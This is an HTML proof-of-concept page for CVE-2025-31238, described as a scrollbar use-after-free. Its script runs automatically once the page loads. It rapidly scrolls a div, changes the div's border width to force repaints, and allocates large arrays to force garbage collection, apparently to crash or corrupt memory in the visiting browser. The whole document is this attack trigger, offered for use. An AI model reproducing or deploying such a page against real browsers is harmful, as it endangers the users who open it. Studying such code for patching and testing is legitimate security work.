<!DOCTYPE html>
<html>
<head>
  <title>CVE-2025-31238 - Scrollbar UAF PoC</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
    }
    #target {
      width: 200px;
      height: 200px;
      overflow: auto;
      border: 1px solid red;
    }
    #content {
      width: 100%;
      height: 5000px;
      background: linear-gradient(#000, #fff);
    }
  </style>
</head>
<body>
  <div id="target">
    <div id="content"></div>
  </div>

  <script>
    const t = document.getElementById("target");

    function triggerUAF() {
      let count = 0;

      function spam() {
        // Fuerza scroll rápido
        t.scrollTop = (t.scrollTop + 1000) % 5000;

        // Crea animaciones forzadas de repintado
        t.style.borderWidth = `${1 + (count % 5)}px`;

        // Forzar reflow + GC
        if (count++ % 10 === 0) {
          let garbage = [];
          for (let i = 0; i < 1000; i++) {
            garbage.push(new Array(1000).fill(Math.random()));
          }
        }

        if (count < 10000) {
          requestAnimationFrame(spam);
        } else {
          console.log("[+] Fin del trigger");
        }
      }

      spam();
    }

    setTimeout(triggerUAF, 1000);
  </script>
</body>
</html>
